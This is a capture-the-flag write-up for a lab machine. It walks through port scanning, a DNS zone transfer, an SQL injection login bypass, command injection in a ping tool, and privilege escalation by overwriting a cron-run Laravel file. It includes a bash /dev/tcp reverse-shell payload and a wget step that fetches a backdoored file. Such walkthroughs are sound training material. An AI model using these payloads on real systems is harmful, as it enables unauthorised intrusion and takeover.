* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)
* [Privesc](#privesc)

## Recon-Enumeration  
sudo masscan -p1-65535 10.10.10.13 -e tun0 --rate=1000  
![alt text](./img/cronos01.PNG?raw=true)  

nmap -A -sC -v -p 22,53,80 10.10.10.13  
![alt text](./img/cronos02.PNG?raw=true)  

gobuster dir -u 10.10.10.13 -w ~/wordlist/big.txt -t 100 -e -x php,html,aspx,txt,xml  
![alt text](./img/cronos03.PNG?raw=true)  

searchsploit apache 2.4.18  
![alt text](./img/cronos04.PNG?raw=true)  

Ok, nothing really useful. Since we have port 53 open, let’s try to get some DNS information  
dig @10.10.10.13 -x 10.10.10.13  
![alt text](./img/cronos05.PNG?raw=true)  


So we have the domain, let’s add it to /etc/hosts  
![alt text](./img/cronos06.PNG?raw=true)  

Now let’s try a zone transfer to find subdomains  
dig axfr cronos.htb @10.10.10.13  
![alt text](./img/cronos07.PNG?raw=true)  

Another 2 subdomains, add them + the DNS (ns1.cronos.htb) to /etc/hosts and now let’s explore them  
![alt text](./img/cronos08.PNG?raw=true)  

Basic enumeration  
gobuster dir -u http://cronos.htb -w ~/wordlists/big.txt -t 100 -e -x php,html,aspx,txt,xml  
![alt text](./img/cronos09.PNG?raw=true)  

Opening the page http://cronos.htb/web.config  
![alt text](./img/cronos10.PNG?raw=true)  

Looks like some sort of rule checking the URL. Let’s access the others subdomains  
![alt text](./img/cronos11.PNG?raw=true)  

## Exploit  

Trying admin:admin  
![alt text](./img/cronos12.PNG?raw=true)  

Trying some SQLi one of them worked 
' or 1=1-- -  
![alt text](./img/cronos13.PNG?raw=true)  

Great, so now we have a traceroute and ping tool  
![alt text](./img/cronos14.PNG?raw=true)  

Ok, maybe we can exploit this. If we try to add ;whoami after the number the code will exec the command too  
![alt text](./img/cronos15.PNG?raw=true)  

So we can use it to obtain a shell  
- Start a netcat listener on port 12345  
- 8.8.8.8;bash -c 'exec bash -i &>/dev/tcp/10.10.14.5/12345 <&1'  
- EXECUTE  

![alt text](./img/cronos16.PNG?raw=true)  

HABEMUS SHELL \o/  

## Privesc  

Get a better shell:  
- python3 -c 'import pty;pty.spawn("/bin/bash")'  
- export TERM=xterm  

sudo -l  
![alt text](./img/cronos17.PNG?raw=true)  

It asks for password  
So let’s enumerate the machine  
cat /etc/passwd  
![alt text](./img/cronos18.PNG?raw=true)  

ls  
![alt text](./img/cronos19.PNG?raw=true)  

Some interesting files…  
![alt text](./img/cronos20.PNG?raw=true)  

Ok, let’s grab the flag before continue  
![alt text](./img/cronos21.PNG?raw=true)  

cat /etc/crontab  
![alt text](./img/cronos22.PNG?raw=true)  

Let’s check the files on /var/www/laravel  
![alt text](./img/cronos23.PNG?raw=true)  

Since we have writing permission, let’s copy the content o f the file and create a new one  
![alt text](./img/cronos24.PNG?raw=true)  
  
Just add those 2 lines and copy the file to the target machine  
Obs.: Those 2 lines can be found [HERE](https://gtfobins.github.io/gtfobins/php/#reverse-shell)

Start a netcat listener on port 4444 and a server  
- nc -nvlp 4444  
- sudo python3 -m http.server 80  

On the target machine let’s overwrite the artisan file  
- wget http://10.10.14.5/artisan2  
- cat artisan2 > artisan  

![alt text](./img/cronos25.PNG?raw=true)  

Now just wait…  
![alt text](./img/cronos26.PNG?raw=true)  

And grab the flag  
![alt text](./img/cronos27.PNG?raw=true)  
